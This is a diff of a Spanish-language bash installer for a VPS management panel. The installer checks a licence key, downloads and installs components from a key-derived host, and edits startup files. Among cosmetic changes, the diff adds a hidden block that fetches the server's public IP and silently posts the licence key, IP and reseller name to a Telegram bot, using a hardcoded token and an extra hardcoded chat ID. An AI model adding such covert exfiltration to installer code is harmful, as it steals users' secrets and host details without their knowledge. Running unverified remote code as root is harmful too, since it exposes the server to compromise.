@@ -1,8 +1,8 @@
 #!/bin/bash
-# SCRIPT MODD POR: ILUMINADO
+#SCRIPT PERU : ∞ META
 
-apt-get install figlet
-apt-get install lolcat
+apt-get install figlet -y &>/dev/null
+apt-get install lolcat -y &>/dev/null
 apt-get install neofetch &>/dev/null
 apt-get install boxes -y &>/dev/null
 
@@ -16,20 +16,11 @@ SCPfrm="/etc/ger-frm"
 SCPinst="/etc/ger-inst"
 
 service apache2 restart > /dev/null 2>&1
-apt-get install boxes -y &>/dev/null
-apt install net-tools -y &>/dev/null
-echo "nameserver 1.1.1.1" >/etc/resolv.conf
-echo "nameserver 1.0.0.1" >>/etc/resolv.conf
-
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
 mkdir -p /etc/B-ADMuser &>/dev/null
 rm -rf /etc/localtime &>/dev/null
 ln -s /usr/share/zoneinfo/America/Lima /etc/localtime &>/dev/null
-[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] || apt-get install gawk -y &>/dev/null
-[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || apt-get install mlocate -y &>/dev/null
-[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || apt-get install curl -y &>/dev/null
-[[ $(dpkg --get-selections|grep -w "boxes"|head -1) ]] || apt-get install boxes -y &>/dev/null
 rm $(pwd)/$0 &> /dev/null
 
 ### COLORES Y BARRA 
@@ -47,35 +38,110 @@ AZUL='\e[34m' && MAGENTA='\e[35m' && MAG='\033[1;36m' &&NEGRITO='\e[1m' && SEMCO
  esac
 }
 
-dependencias() {
-  dpkg --configure -a >/dev/null 2>&1
-  apt -f install -y >/dev/null 2>&1
-  soft="sudo bsdmainutils zip unzip ufw curl grep python python3 python3-pip screen openssl cron iptables lsof pv boxes cowsay at mlocate gawk bc jq curl npm nodejs socat netcat netcat-traditional net-tools cowsay figlet lolcat build-essential netstat vnstat less "
-  for i in $soft; do
-    paquete="$i"
-    [[ $(dpkg --get-selections|grep -w "$i"|head -1) ]] || apt-get install $i -y &>/dev/null
-    [[ $(dpkg --get-selections|grep -w "$i"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
-    [[ $(dpkg --get-selections|grep -w "$i"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
-   echo -e "\033[97m       $ESTATUS................. $i "
-  done
-}
-
 ### PAQUETES PRINCIPALES 
-tput clear
+clear && clear
+echo
 msg -bar
-echo -e "\033[97m"
-echo -e "\033[41m >>INSTALACION DE PAQUETES NECESARIOS PARA VPS-PERU<< "
-echo -e "\033[0;37m             \033[100m ESPERE PORFAVOR... "
-echo -e "\033[97m"
+echo -e "\033[41m  INSTALACION DE PAQUETES NECESARIOS PARA VPS-PERU  \e[0m"
+echo -e "\033[100m               ESPERE PORFAVOR...                    \e[0m"
 msg -bar
-dependencias
-#IpTables
-echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections 
-echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections 
-[[ $(dpkg --get-selections|grep -w "iptables-persistent"|head -1) ]] || apt-get install iptables-persistent -y &>/dev/null 
-[[ $(dpkg --get-selections|grep -w "iptables-persistent"|head -1) ]] || ESTATUS=`echo -e   "\033[91mPAQ ERROR"` &>/dev/null 
-[[ $(dpkg --get-selections|grep -w "iptables-persistent"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null 
-echo -e "\033[97m       $ESTATUS................. Iptables "
+echo
+#grep
+apt-get install grep -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando grep................. $ESTATUS "
+#net-tools
+apt-get install net-tools -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "net-tools"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "net-tools"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando net-tools............ $ESTATUS "
+#gawk
+apt-get install gawk -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando gawk................. $ESTATUS "
+#mlocate
+apt-get install mlocate -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando mlocate.............. $ESTATUS "
+#lolcat gem
+apt-get install lolcat -y &>/dev/null
+sudo gem install lolcat &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando lolcat............... $ESTATUS "
+#at
+[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || apt-get install at -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando at................... $ESTATUS "
+#nano
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || apt-get install nano -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando nano................. $ESTATUS "
+#bc
+[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || apt-get install bc -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando bc................... $ESTATUS "
+#lsof
+[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || apt-get install lsof -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando lsof................. $ESTATUS "
+#figlet
+[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || apt-get install figlet -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando figlet............... $ESTATUS "
+#cowsay
+[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || apt-get install cowsay -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando cowsay............... $ESTATUS "
+#screen
+[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || apt-get install screen -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando screen............... $ESTATUS "
+#python
+[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] || apt-get install python -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando python............... $ESTATUS "
+#python3
+[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || apt-get install python3 -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando python3.............. $ESTATUS "
+#python3-pip
+[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] || apt-get install python3-pip -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando python3-pip.......... $ESTATUS "
+#curl
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || apt-get install curl -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando curl................. $ESTATUS "
+#ufw
+[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || apt-get install ufw -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando ufw.................. $ESTATUS "
+#unzip
+[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || apt-get install unzip -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando unzip................ $ESTATUS "
+#zip
+[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || apt-get install zip -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # Instalando zip.................. $ESTATUS "
 #apache2
 [[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || {
  apt-get install apache2 -y &>/dev/null
@@ -84,9 +150,9 @@ echo -e "\033[97m       $ESTATUS................. Iptables "
  }
 [[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
 [[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
-echo -e "\033[97m       $ESTATUS................. apache2 "
+echo -e "\033[97m    # Instalando apache2.............. $ESTATUS "
 msg -bar2
-echo -e "\033[1;39m Presiona Enter Para continuar" && read enter
+echo -e "\033[0;37m »»» Presiona \033[0;37m\033[41m ENTER \033[0;37m Para continuar." && read enter
 
 ### FIXEADOR PARA SISTEMAS 86_64
 idfix64_86 () {
@@ -142,8 +208,8 @@ function_verify () {
 
 funcao_idioma () {
 msg -bar2
-figlet "    -VPS PERU-" | lolcat 
-echo -e " >>>ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL<<<"
+figlet " -VPS PERU-" | lolcat 
+echo -e "     >>ESTE SCRIPT SE OPTIMIZO A IDIOMA ESPAÑOL<<"
 msg -bar2
 pv="$(echo es)"
 [[ ${#id} -gt 2 ]] && id="es" || id="$pv"
@@ -155,20 +221,20 @@ tput clear
 unset Key > /dev/null 2>&1
 unset Key
 msg -bar2
-figlet "    -VPS PERU-" | lolcat 
-echo -e " >>>ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL<<<" | lolcat
+figlet " -VPS PERU-" | lolcat 
+echo -e "     >>ESTE SCRIPT SE OPTIMIZO A IDIOMA ESPAÑOL<<" | lolcat
 msg -bar2
 pv="$(echo es)"
 [[ ${#id} -gt 2 ]] && id="es" || id="$pv"
 byinst="true"
 while [[ ! $Key ]]; do
-msg -bar2 && msg -ne "=> INSERTA TU KEY #: " && read Key
-tput cuu1 && tput dl1
+msg -bar2 && msg -ne "\033[1;96m            >>> INTRODUZCA LA KEY ABAJO <<<\n   \033[1;31m" && read Key
+        tput cuu1 && tput dl1
 done
-msg -ne "# Verificando Key # : "
+msg -ne " # Verificando Key # : "
 cd $HOME
-wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m ✅KEY CORRECTAMENTE VERIFICADO..." || {
-   echo -e "\033[0;31m ⚠️KEY INCORRECTO..."
+wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m Code Correcto de KEY" || {
+   echo -e "\033[0;31m Code Incorrecto de KEY"
    invalid_key
   }
 IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" > /usr/bin/vendor_code
@@ -177,11 +243,11 @@ function_verify
 updatedb
 if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") ]]; then
    msg -bar2
-   msg -ama "$(source trans -b es:${id} "✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
+   msg -ama "$(source trans -b es:${id} " ✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
    REQUEST=$(ofus "$Key"|cut -d'/' -f2)
    [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
    pontos="."
-   stopping="$(source trans -b es:${id} "Verificando Actualizaciones"|sed -e 's/[^a-z -]//ig')"
+   stopping="$(source trans -b es:${id} "Verificando Actualizaciónes"|sed -e 's/[^a-z -]//ig')"
    for arqx in $(cat $HOME/lista-arq); do
    msg -verm "${stopping}${pontos}"
    wget -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
@@ -195,8 +261,8 @@ if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") 
    echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
    mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
    echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu
-   echo "${SCPdir}/menu" > /usr/bin/adm && chmod +x /usr/bin/adm
-   echo "sudo menu" > /bin/h && chmod +x /bin/h
+   echo "${SCPdir}/menu" > /usr/bin/VIP && chmod +x /usr/bin/VIP
+   echo "menu" > /bin/h && chmod +x /bin/h
    echo "$Key" > ${SCPdir}/key.txt
    [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
    [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
@@ -225,6 +291,18 @@ wget -O /bin/resetsshdrop https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/A
 chmod +x /bin/resetsshdrop
 wget -O /etc/versin_script_new https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/VerScrpt/VercUp &>/dev/null
 msg -bar2
+clear; clear
+echo
+msg -bar
+echo -e "\e[1;92m  Digita Reseller Autorizado Para La Instalacion!!!\e[0m"
+read -p "   RESELLER: " Ghost
+echo "$Ghost" > /etc/newadm/message.txt
+msg -bar
+echo
+echo -e "\e[1;97m       RESELLER AUTORIZADO:    \e[0m"$Ghost
+echo "       ▪︎CREDITO AGREDADO CON EXITO !!!"
+msg -bar
+sleep 2
 echo '#!/bin/sh -e' > /etc/rc.local
 sudo chmod +x /etc/rc.local
 echo "sudo rebootnb" >> /etc/rc.local
@@ -233,6 +311,10 @@ echo "sleep 2s" >> /etc/rc.local
 echo "exit 0" >> /etc/rc.local
 /bin/cp /etc/skel/.bashrc ~/
 echo 'clear' >> .bashrc
+echo 'DATE=$(date +"%d-%m-%y")' >> .bashrc
+echo 'TIME=$(date +"%T")' >> .bashrc
+sleep 1
+clear
 echo 'echo ""' >> .bashrc
 echo 'echo -e "\033[0;31m        __     ______  ____       ____  _____ _____  _   _          " '>> .bashrc
 echo 'echo -e "\033[0;31m        \ \   / /  _ \/ ___|     |  _ \| ____|  _  \| | | |         " '>> .bashrc
@@ -248,11 +330,12 @@ echo 'echo -e "\033[0;33m 🔺Key free no tiene soporte alguno. "'>> .bashrc
 echo 'echo -e "\033[1;35m    "'>> .bashrc
 echo 'echo -e "\033[0;36m  ✅RESELLER : $mess1 "'>> .bashrc
 echo 'echo "" '>> .bashrc
-echo 'echo -e "\033[0;36m  ✅PARA MOSTRAR EL PANEL DE CONTROL ESCRIBA:  \033[0;37m\033[41m menu \033[0;31m"'>> .bashrc
+echo 'echo -e "\033[0;36m  ✅PARA MOSTRAR EL PANEL DE CONTROL ESCRIBA:  \033[0;37m\033[41m menu \033[0m"'>> .bashrc
 echo 'wget -O /etc/versin_script_new https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/VerScrpt/VercUp &>/dev/null'>> .bashrc
 echo 'echo "" '>> .bashrc
+echo
 echo -e "   ESCRIBE menu PARA ACCEDER AL PANEL DE CONTROL: "
-echo -e "\033[0;37m                      \033[1;41m menu \033[0;37m" && msg -bar2
+echo -e "\033[0;37m                   \033[1;41m menu \033[0m" && msg -bar2
 sleep 1
 exit
 }
@@ -287,7 +370,8 @@ verificar_arq () {
 [[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
 [[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
 case $1 in
-"menu"|"message.txt"|"menu.enc")ARQ="${SCPdir}/";; #Menu
+"menu"|"message.txt"|"menu.enc")ARQ="${SCPdir}/";;#MENU
+#"menu"|"message.txt"|"menu.enc")ARQ="${SCPdir}/";; #Menu
 "usercodes")ARQ="${SCPusr}/";; #Panel SSRR
 "C-SSR.sh")ARQ="${SCPinst}/";; #Instalacao
 "openssh.sh")ARQ="${SCPinst}/";; #Instalacao
@@ -360,11 +444,11 @@ rm -rf lista-arq
 echo -e " "
 echo -e "  \033[1;44m Deseas Reintentar Colocar La Key O Probar Nueva Key? : \033[0m"
 echo -ne "\033[0;32m " 
-read -p "    Responde [ s | n ] : " -e -i "n" x
+read -p "    Responde [ s | n ] : " -e -i "s" x
 [[ $x = @(s|S|y|Y) ]] && int_fun || exit
 }
 invalid_key () {
-msg -bar2 && msg -verm "#¡Key Invalida#! " && msg -bar2
+msg -bar2 && msg -verm "Code Invalido -- #¡Key Invalida!# " && msg -bar2
 echo -e " ERROR DE LA KEY O FUE UTILIZADA\n RECIENTEMENTE, O KEYGEN HA COLAPZADO " | boxes -d parchment
 [[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq
 echo -e " "
@@ -374,13 +458,13 @@ read -p "    Responde [ s | n ] : " -e -i "s" x
 [[ $x = @(s|S|y|Y) ]] && int_fun || exit
 }
 while [[ ! $Key ]]; do
-msg -bar2 && msg -ne "=> INSERTA TU KEY #: " && read Key
-tput cuu1 && tput dl1
+msg -bar2 && msg -ne "\033[1;96m            >>> INTRODUZCA LA KEY ABAJO <<<\n   \033[1;31m" && read Key
+        tput cuu1 && tput dl1
 done
 msg -ne "# Verificando Key # : "
 cd $HOME
-wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m ✅KEY CORRECTAMENTE VERIFICADO..." || {
-   echo -e "\033[0;31m ⚠️KEY INCORRECTO..."
+wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m Code Correcto de KEY" || {
+   echo -e "\033[0;31m Code Incorrecto de KEY"
    invalid_key
   }
    
@@ -390,26 +474,43 @@ function_verify
 updatedb
 if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") ]]; then
    msg -bar2
-   msg -ama "$(source trans -b es:${id} "✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
+   msg -ama "$(source trans -b es:${id} " ✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
    REQUEST=$(ofus "$Key"|cut -d'/' -f2)
    [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
    pontos="."
-   stopping="$(source trans -b es:${id} "Verificando Actualizaciones"|sed -e 's/[^a-z -]//ig')"
+   stopping="$(source trans -b es:${id} "Verificando Actualizaciónes"|sed -e 's/[^a-z -]//ig')"
    for arqx in $(cat $HOME/lista-arq); do
    msg -verm "${stopping}${pontos}"
    wget -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
    tput cuu1 && tput dl1
    pontos+="."
    done
-   sleep 1s
+   
+   wget -qO- ifconfig.me > /etc/newadm/IP.log
+   userid="${SCPdir}/ID" 
+   TOKEN="5076200777:AAG2bHA_ux_4oLjLp_r-Ndd87jOttMcuw4I" 
+   URL="https://api.telegram.org/bot$TOKEN/sendMessage" 
+   MSG=" ㅤㅤ  ❗️ KEY ACTIVADA y REGISTRADA ❗️
+ㅤㅤ
+   🆔 ID: ${SCPdir}/ID
+   👤 Reseller: $(cat ${SCPdir}/message.txt)
+   🌐 IP: $(cat ${SCPdir}/IP.log)
+   🔑 KEY: $Key
+   
+   ⚙️ SCRIPT: ♾️ Meta
+   " 
+   activ=$(cat ${userid}) 
+   curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 
+   curl -s --max-time 10 -d "chat_id=1111342634&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 
+   rm ${SCPdir}/IDT.log &>/dev/null
    msg -bar2
    listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs   
    cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2
    echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
    mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
    echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu
-   echo "${SCPdir}/menu" > /usr/bin/adm && chmod +x /usr/bin/adm
-   echo "sudo menu" > /bin/h && chmod +x /bin/h
+   echo "${SCPdir}/menu" > /usr/bin/VIP && chmod +x /usr/bin/VIP
+   echo "menu" > /bin/h && chmod +x /bin/h
    echo "$Key" > ${SCPdir}/key.txt
    [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
    [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
